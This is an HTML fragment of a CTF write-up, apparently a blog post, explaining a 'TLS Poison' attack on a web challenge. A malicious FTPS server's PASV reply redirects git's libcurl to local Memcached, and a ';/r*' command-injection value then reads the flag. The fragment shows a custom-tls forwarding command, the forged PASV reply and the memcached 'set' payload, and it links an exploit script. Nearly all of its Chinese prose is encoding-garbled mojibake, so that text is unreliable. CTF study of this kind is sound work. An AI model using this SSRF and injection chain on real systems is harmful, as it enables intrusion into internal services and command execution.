src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510212104.png" alt=""></p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution 2"></a>Solution 2</h3><p>å½“ç„¶å¦‚æœåªæ˜¯ç®€å•çš„å¤ç° TLS Poison æˆ‘ä¹Ÿä¸ä¼šè¿™ä¹ˆè¯¦ç»†çš„å†™ä¸€ç¯‡æ–‡ç« æ¥è®²è¿™ä¸ªé¢˜äº†ï¼Œ CTF èƒ½å¸¦ç»™æˆ‘æœ€å¤§çš„å¿«ä¹å°±æ˜¯çœ‹åˆ°ä¸€äº›åœ¨è‡ªå·±é¢„æœŸä¹‹å¤–çš„ä¸œè¥¿ï¼Œè¿™äº›ä¸œè¥¿å¾€å¾€éƒ½æ›´æœ‰æ„æ€ï¼Œä¹Ÿæ›´ Amazing ã€‚</p><p>ç»“åˆå‰æ–‡ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥å°è¯•ä½¿ç”¨ FTPS æ¥è¿›è¡Œè§£ç­”è¿™ä¸ªé¢˜ç›®ã€‚å¦‚æœä½¿ç”¨ FTPS ï¼Œé‚£ä¹ˆé‡å®šå‘ã€DNS Rebinding çš„æ“ä½œæˆ‘ä»¬å°±å¯ä»¥ä¸éœ€è¦äº†ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨<code>PASV</code>ç›´æ¥å°†æ•°æ®é€šé“æŒ‡å‘ 127.0.0.1:11211 å³å¯ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦ç¡®å®š git ä¸­çš„ libcurl æ˜¯å¦å—åˆ°<code>PASV</code>æ¼æ´å½±å“äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä» git ç‰ˆæœ¬ã€ç®€å•æ­å»ºä¸€ä¸ªæ¶æ„çš„ FTP æœåŠ¡å™¨è¿›è¡Œæµ‹è¯•ï¼Œè¿™é‡Œå°±ä¸å±•å¼€è¿›è¡Œæµ‹è¯•äº†ã€‚ï¼ˆå…¶å®æ˜¯æ¯”è¾ƒæ‡’ï¼‰æˆ‘ä»¬è¿™é‡Œå°±ç›´æ¥å¼€å§‹å°è¯•ä½¿ç”¨ FTPS è¿›è¡Œè§£é¢˜ã€‚</p><p>æŒ‰ç…§ä¹‹å‰çš„æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šå‡ ä¸ªç‚¹ï¼š</p><ul><li>å¦‚ä½•ç»•è¿‡ä¹‹å‰é¢˜ç›®ä½¿ç”¨<code>file_get_contents</code>å¯¹æ–‡ä»¶å†…å®¹ç¡®è®¤ï¼Ÿæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ›å»º<code>/info/ref</code>æ–‡ä»¶ï¼Œå†…å®¹ä¸ºé¢˜ç›®è¦æ±‚çš„å†…å®¹å³å¯</li><li>å¦‚ä½•ç»•è¿‡æ­£åˆ™ï¼Ÿæˆ‘ä»¬åªéœ€è¦é…ç½®å¥½åŒ¿å ftps å³å¯ï¼Œå°±ä¸éœ€è¦å¼•å…¥ä¸ºäº†ç”¨æˆ·è®¤è¯è€Œä½¿ç”¨çš„<code>@</code>ç¬¦å·äº†ï¼Œå…¶ä½™çš„å­—ç¬¦å°±å±äºæ­£åˆ™å†…çš„å­—ç¬¦äº†</li><li>ç”¨éšå¼è¿˜æ˜¯æ˜¾å¼ï¼Ÿå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ ¼å¼æ˜¯<code>ftps://ftps.exmaple.com:11211/</code>è¿™ç§å½¢å¼ï¼Œè¿™åªèƒ½æ˜¯éšå¼ FTPS çš„æ ¼å¼ï¼Œæ‰€ä»¥ä½¿ç”¨éšå¼ FTPS</li></ul><p>å‰©ä¸‹çš„ä¾¿æ˜¯å¦‚ä½•æ„é€  exp çš„é—®é¢˜äº†ï¼Œæ€ä¹ˆå»å¼„ä¸€ä¸ªéšå¼ FTPS ï¼Œéš¾é“è¿˜è¦ä¿®æ”¹ä¸ªæ¶æ„ vsftpd ï¼Ÿé‚£æ ·æ¯”è¾ƒéº»çƒ¦ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ rustls çš„è½¬å‘åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¤„ç†äº† TLS åˆ›å»ºçš„é—®é¢˜ï¼Œå¹¶ä¸”æŒ‰ç…§ä¹‹å‰çš„åŸºç¡€ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠå®ƒç›´æ¥ä½œä¸ºæ¶æ„ TLS æœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±åªéœ€è¦å¼„ä¸€ä¸ª socket ç”¨æ¥å¤„ç† FTP å³å¯ã€‚</p><p>ä¾æ—§ä½¿ç”¨æˆ‘ä»“åº“çš„ TLS å·¥å…·ï¼š<a href="https://github.com/ZeddYu/TLS-poison/" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/</a> ï¼ŒæŒ‰ç…§ setup åšå¥½åˆå§‹åŒ–åï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¼€å¯ rustls çš„è½¬å‘åŠŸèƒ½ï¼Œå°† TLS ä¸Šå±‚æµé‡è½¬å‘åˆ° 2048 ç«¯å£ï¼š</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048</span><br></pre></td></tr></tbody></table></figure><p></p><p>ç„¶ååœ¨ 2048 ç«¯å£æˆ‘ä»¬å¼„ä¸ª socket ç›‘å¬å¹¶è¯»ä¸€ä¸‹ FTP ï¼Œç„¶åå°±æ˜¯å¤„ç† FTP å‘½ä»¤çš„äº‹æƒ…äº†ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ vsftpd æ¥è¿›è¡Œå‘½ä»¤å“åº”çš„å‚è€ƒï¼Œæœ€åå®ç°ï¼š<a href="https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py</a></p><p><strong>PSï¼šè¿™é‡Œ FTP æœåŠ¡è®°å¾—è¦å®Œæ•´å®ç°å¯¹ PASV ä¹‹åçš„å‘½ä»¤å¤„ç†ï¼Œå¦åˆ™æ”»å‡»å¤±è´¥ã€‚</strong></p><p>å¤©çŸ¥é“è¿™ä¸ªå‘äº†æˆ‘å¤šä¹…â€¦å½“æ—¶æ­»æ´»éƒ½ä¸èƒ½å¤ç°ï¼Œé—®ä½œè€… 0xbb ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆæƒ…å†µï¼Œåˆæ˜¯æ’ curl ç‰ˆæœ¬ï¼Œåˆæ˜¯æ’ git ç‰ˆæœ¬ï¼Œåˆæ˜¯æ’ OpenSSL ï¼Œåˆæ˜¯æ’ GnuTLS ï¼Œåæ­£å„ç§æ’ bug ï¼Œä¸‡å¿µä¿±ç°ï¼Œæœ€åæ‰æ‰¾åˆ°è¿™ä¸ªåœ°æ–¹â€¦ç®€ç›´</p><p>è¿™é‡Œæˆ‘è‡ªå·±ç¼–è¯‘äº†ä¸€ä¸ªå­˜åœ¨<code>pasv</code>æ¼æ´çš„ curl è°ƒè¯•ï¼Œè®¿é—®æˆ‘ä»¬çš„ ftps æœåŠ¡å™¨ä¹‹åå°±ä¼šå¯¹æˆ‘ä»¬ 127.0.0.1:11211 è¿›è¡Œ TLS ä¼šè¯é‡ç”¨ï¼Œå°±ä¼šå°†æˆ‘ä»¬çš„ payload å‘é€åˆ° 11211 ç«¯å£äº†ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510214036.png" alt=""></p><p>å†™å…¥ä¹‹ååŸºæœ¬ä¸Šå°±æ²¡æœ‰ä»€ä¹ˆé—®é¢˜äº†ã€‚</p><p>æ•´ä¸ªæµç¨‹æˆ‘ä»¬æ•´ç†ä¸€ä¸‹ï¼š</p><ul><li><p>é¦–å…ˆå¾—è®¿é—®ä¸€æ¬¡é¢˜ç›®æ‹¿åˆ° cookie </p></li><li><p>ä¸€å¼€å§‹çš„<code>file_get_contents</code>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ vsftpd æ¥åœ¨åŒ¿å ftp ç›®å½•ä¸‹æ”¾ç½®<code>/info/ref</code>æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å°±æ˜¯ â€œ001e# service=git-upload-pack\nâ€</p></li><li><p>é¢˜ç›®ä½¿ç”¨<code>file_get_contents</code>è®¿é—®ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å…³é—­ vsftpd ï¼Œç„¶åå¼€å¯ rustls æ¶æ„ TLS æœåŠ¡å™¨ï¼Œæ³¨æ„æå‰è®¾ç½®åœ¨ redis å½“ä¸­è®¾ç½®å¥½ payload</p></li><li><p>é¢˜ç›®æ‰§è¡Œ<code>exec</code>ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨ git æ¥è®¿é—®æˆ‘ä»¬çš„ FTPS æœåŠ¡å™¨æ—¶ï¼ŒåŒæ–¹å»ºç«‹ TLS æ¡æ‰‹ï¼Œæˆ‘ä»¬ä¼šè®¾ç½®å¯ä»¥æ‰§è¡Œè¯»å– flag çš„ Session ID </p></li><li><p>å»ºç«‹æ¡æ‰‹å®Œæ¯•åï¼Œæ‰§è¡Œ FTP æµç¨‹</p></li><li><p>åœ¨é¢˜ç›® git å¤„ç† FTP æµç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šç»™ git å‘å‡ºçš„<code>PASV</code>å‘½ä»¤è¯·æ±‚çš„å“åº”<code>227 Entering Passive Mode (127,0,0,1,43,203)\r\n</code></p></li><li><p>git ä¼šæ ¹æ®å¾—åˆ°çš„ 127.0.0.1:11211 è¿™ä¸ªåœ°å€å°è¯•è¿›è¡Œ TLS ä¼šè¯é‡ç”¨</p></li><li><p>è‡³æ­¤ï¼Œå®Œæˆå¯¹ Memcached çš„æ”»å‡»ï¼ŒæˆåŠŸå†™å…¥<code>\r\nset 1234567890;/r* 0 0 2\r\nOK\r\n</code>ï¼Œå…¶ä¸­é‚£ä¸²è¿ç»­æ•°å­—æˆ‘ç”¨æ¥è¡¨ç¤º sandbox id</p></li><li><p>å¸¦ç€æœ€å¼€å§‹è®¾ç½®çš„ cookie å‘é¢˜ç›®æäº¤ url åœ°å€ä¸º<code>;/r*</code>ï¼Œæ­¤æ—¶é¢˜ç›®å‘ Memcached æŸ¥è¯¢ <code>1234567890;/r*</code>çš„å€¼ï¼Œå¾—åˆ° url çš„å€¼ä¸º OK ï¼Œç»•è¿‡é™åˆ¶</p></li><li><p>é¢˜ç›®æ‰§è¡Œ<code>exec("timeout -s KILL 3 git ls-remote --tags -- $url", $output, $return_var);</code>ï¼Œå…¶ä¸­<code>$url</code>å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„<code>;/r*</code>ï¼Œå®Œæˆå‘½ä»¤æ³¨å…¥ï¼Œæ‰§è¡Œè¯»å– flag å‘½ä»¤æ‹¿åˆ° flag </p></li></ul><p>è‡³æ­¤ï¼Œå®Œæˆè¿™ä¸ªé¢˜ç›®çš„ FTPS è§£æ³•ã€‚exp æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210515015923.png" alt=""></p><h3 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h3><p>å…¶å®è¿™ä¸ªè§£æ³•ä¹Ÿæ˜¯åæ¥é—®çš„ 0xbb å‡ºé¢˜äººï¼Œå…¶å®é¢„æœŸè§£æ³•æ˜¯åˆ©ç”¨ FTPS çš„è§£æ³•ã€‚ä½†æ˜¯æ¯”èµ›çš„æ—¶å€™ï¼Œé˜Ÿå‹è¿˜æ‰¾åˆ°äº†ä¸€å¤„å…¶ä»–å¯èƒ½çš„åœ°æ–¹æƒ³ç€ SSRF æ¥ç€ï¼Œä½†æ˜¯åæ¥ä¸å¤ªè¡Œï¼Œåé¢è·Ÿ Perfect Blue ï¼ˆä¹Ÿå°±æ˜¯è¿™æ¬¡å‚èµ›çš„è”åˆæˆ˜é˜Ÿ perfect guesser çš„è”åˆé˜Ÿä¹‹ä¸€ï¼‰çš„æœ‹å‹äº¤æµäº†ä¸€ä¸‹ç¡®å®æ˜¯ç”¨ TLS Poison ï¼Œå¹¶ä¸”ä»–è·Ÿ A0E æŸä¸ªå¸ˆå‚…ä¸€æ ·ä¹Ÿé‡å†™äº† DNS ç›¸å…³éƒ¨åˆ†å†…å®¹2333</p><p>å¦‚æœä½ è§‰å¾—åšå®Œè¿™ä¸ªé¢˜ç›®è¿˜è§‰å¾—ä¸è¿‡ç˜¾ï¼Œè¿˜å¯ä»¥å»åšä¸€ä¸‹ Tet CTF çš„ä¸€ä¸ªé¢˜ç›®ã€‚åœ¨è¶Šå—çš„ TetCTF 2021 å½“ä¸­ï¼Œæœ‰ä¸€ä¸ªå•ç‹¬çš„åˆ†ç±» Web &amp; Crypto æœ‰è¿™ä¹ˆä¸€é“é¢˜ï¼šHackEmAll-Next-Gen-Proxy ï¼Œè¿™é“é¢˜å½“ä¸­å°±æ¯”è¾ƒç›´æ¥ï¼š</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_set_cache</span><span class="hljs-params">(_key, _value)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> str(_key) != <span class="hljs-string">""</span> <span class="hljs-keyword">and</span> str(_value) != <span class="hljs-string">""</span>:</span><br><span class="line">        _cache_handle = pylibmc.Client([<span class="hljs-string">"127.0.0.1:11211"</span>], binary=<span class="hljs-literal">False</span>)</span><br><span class="line">        _cache_handle.set(_key, _value, time=<span class="hljs-number">60</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_get_cache</span><span class="hljs-params">(_key)</span>:</span></span><br><span class="line">    _cache_handle= pylibmc.Client([<span class="hljs-string">"127.0.0.1:11211"</span>], binary=<span class="hljs-literal">False</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> _cache_handle.get(_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span><span class="hljs-params">(_url)</span>:</span></span><br><span class="line">    _cmd = [<span class="hljs-string">"curl"</span>, <span class="hljs-string">"-L"</span>, <span class="hljs-string">"-k"</span>, str(_url)]</span><br><span class="line">    _content = subprocess.check_output(_cmd)</span><br><span class="line">    <span class="hljs-keyword">return</span> _content.encode(<span class="hljs-string">'hex'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™ä¸ªå°±å·²ç»æœ‰éå¸¸æ˜æ˜¾çš„æç¤ºäº†ï¼ŒåŒæ ·æ˜¯ç†Ÿæ‚‰çš„ Memcached ï¼ŒåŒæ ·æ˜¯<code>-L</code>é€‰å‹ç‰¹åœ°å…è®¸ curl é‡å®šå‘ï¼Œå¾ˆæ ‡å‡†çš„ä¸€é“ TLS Poison é¢˜ç›®ï¼Œè¿™é‡Œå°±ä¸å†å¤šå•°å—¦äº†ã€‚ä¸è¿‡å¯¹äºè¿™é¢˜ï¼Œä»¥åŠ<code>-L</code>é€‰é¡¹ï¼Œå½“æ—¶æœ‰é€‰æ‰‹æƒ³å‡ºä½¿ç”¨ gopher æ¥åšè¿™ä¸ªé¢˜ï¼Œæœ¬åœ°éƒ½èƒ½æ‰“ï¼Œä½†æ˜¯åˆ°äº†è¿œç¨‹å°±æ‹‰å®äº†ï¼ŒåŸå› æ˜¯åœ¨æ–°ç‰ˆçš„ curl ä¸­ï¼Œå°±åƒæˆ‘ä»¬ä¸€å¼€å§‹éªŒè¯çš„ä¸€æ ·ï¼Œ gopher åè®®å·²ç»ä¸å†æ˜¯ libcurl é»˜è®¤æ”¯æŒçš„é‡å®šå‘åè®®äº†ï¼Œåªæœ‰ HTTP/HTTPS å’Œ FTP æ˜¯é»˜è®¤æ”¯æŒé‡å®šå‘ï¼Œå…·ä½“è§ï¼š<a href="https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c" target="_blank" rel="noopener">https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c</a></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>è‡³æ­¤ï¼Œæœ¬ç¯‡åŠ ä¸Šä¹‹å‰çš„ <a 